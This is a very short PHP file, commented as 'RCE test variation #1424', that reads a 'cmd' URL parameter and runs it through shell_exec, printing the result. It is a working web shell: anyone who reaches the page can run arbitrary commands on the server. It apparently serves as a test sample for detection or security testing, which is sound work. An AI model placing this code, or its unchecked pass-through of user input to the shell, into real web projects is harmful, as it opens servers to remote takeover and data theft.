<?php
// RCE test variation #1424
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>